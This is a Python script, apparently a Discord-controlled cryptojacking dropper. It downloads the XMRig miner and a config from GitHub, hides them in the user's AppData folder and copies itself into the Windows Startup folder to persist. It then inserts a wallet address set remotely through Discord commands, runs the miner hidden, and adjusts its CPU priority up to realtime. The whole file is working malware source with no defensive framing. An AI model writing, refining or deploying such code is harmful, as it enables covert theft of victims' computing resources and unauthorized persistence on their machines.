import requests
import discord
import json
import os
from pathlib import Path
import shutil
import psutil
import zipfile
import subprocess

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print("We've logged in as: {0.user}".format(client))

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    if message.content.startswith("$"):
        if "addr" in message.content:
            list1 = message.content.split()
            new_addr = list1[1]

            path_sh = os.getcwd() + '\\wlt.txt'

            with open(path_sh, 'w') as file:
                file.write(str(new_addr))

            await message.channel.send("Wallet address set to: ")
            await message.channel.send(new_addr)

        if "priority" in message.content:
            list2 = message.content.split()
            priority = list2[1]

            path_pr = os.getcwd() + '\\prt.txt'

            with open(path_pr, 'w') as file:
                file.write(str(priority))

            await message.channel.send("Computation priority set to: ")

            if priority == "low":
                await message.channel.send("Low")
            
            if priority == "bnom":
                await message.channel.send("Below Normal")

            if priority == "nom":
                await message.channel.send("Normal")

            if priority == "anom":
                await message.channel.send("Above Normal")

            if priority == "high":
                await message.channel.send("High")

            if priority == "rltm":
                await message.channel.send("Realtime")

        if "ping" in message.content:
            await message.channel.send("Running!")


def download_file(url, filename=''):
    req = requests.get(url)
    try:
        if filename:
            pass
        else:
            filename = req.url[url.rfind('/')+1:]

        with requests.get(url) as req:
            with open(filename, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            return filename
    except Exception as e:
        print(e)
        return None
    

def priority():
    prt = os.getcwd()+'\\prt.txt'

    for proc in psutil.process_iter(['pid', 'name']):
        if 'xmrig.exe' in proc.info['name']:
            pid = proc.info['pid']
            
            try:
                with open(prt, 'r') as file:
                    if os.stat(prt).st_size == 0:
                        print("File priority is empty.")
                    lines = str(file.read)

                    if lines == "low":
                        p = psutil.LOW_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'low'")

                    if lines == "bnom":
                        p = psutil.BELOW_NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'below normal'")

                    if lines == "nom":
                        p = psutil.NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'normal'")

                    if lines == "anom":
                        p = psutil.ABOVE_NORMAL_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'above normal'")

                    if lines == "high":
                        p = psutil.HIGH_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'high'")

                    if lines == "rltm":
                        p = psutil.REALTIME_PRIORITY_CLASS
                        psutil.Process(pid).nice(p)
                        print(f"Priority class of {proc.info['name']} (PID: {pid}) changed to 'realtime'")
            except Exception:
                pass

            break


def main():

    global dest_path
    dest_path = 'C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming'
    extract = os.getcwd() + '\\xmrig-6.21.0.zip'
    path = os.getcwd() + '\\xmrig-6.21.0\\xmrig.exe'
    wallet = os.getcwd() + '\\wlt.txt'
    json_file = os.getcwd() + '\\config.json'
    json_open = dest_path + '\\config.json'
    copy_path = Path(os.getcwd()+'\\'+os.path.basename(__file__)).stem
    
    
    if os.path.exists(dest_path + '\\xmrig.exe' or dest_path + '\\config.json'):
        print("Files already exist.")
    else:
        rig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip'
        config_url = 'https://github.com/ptristan88/miners/blob/main/config.json'
        download_file(rig_url, 'xmrig-6.21.0.zip')
        download_file(config_url, 'config.json')
        
        with zipfile.ZipFile(extract, 'r') as zip_ref:
            zip_ref.extractall()
            zip_ref.close()

    if os.path.exists(dest_path + '\\xmrig.exe') == False:
        shutil.move(path, dest_path)
    if os.path.exists(dest_path + '\\config.json') == False:
        shutil.move(json_file, dest_path)

    try:
        os.remove(os.getcwd()+'\\xmrig-6.21.0.zip')
        os.remove(os.getcwd()+'\\xmrig-6.21.0')
    except Exception:
        pass

    try:
        shutil.copy(os.getcwd()+'\\'+os.path.basename(__file__),'C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        print("Successfully copied as .pyw")
    except Exception as e:
        print(e)
        pass

    try:
        shutil.copy(os.getcwd()+'\\'+copy_path+'.exe','C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        print("Successfully copied as .exe")

    except Exception as e:
        print(e)
        pass


    try:
        with open(wallet, 'r') as file:
            if os.stat(wallet).st_size == 0:
                print("File wallet is empty.")
                pass
            else:
                with open(json_open, 'r') as fileee:
                    data = json.load(fileee)
                
                addr = file.read()
                data["pools"][0]["user"] = addr

                with open(json_open, 'w') as filee:
                    json.dump(data, filee, indent=4)


    except Exception as e:
        print(e)
        pass

    subprocess.Popen([dest_path + '\\xmrig.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

if __name__ == "__main__":
    main()
    priority()
    client.run('481mP6nfjzRZFkuHiACSc4L2o3vqFsCx6R63QEo4AJQQUta32UyYVHkWaVJMR1hKgQi7fScTecHuBab8s5QiwMppEg7DbVs')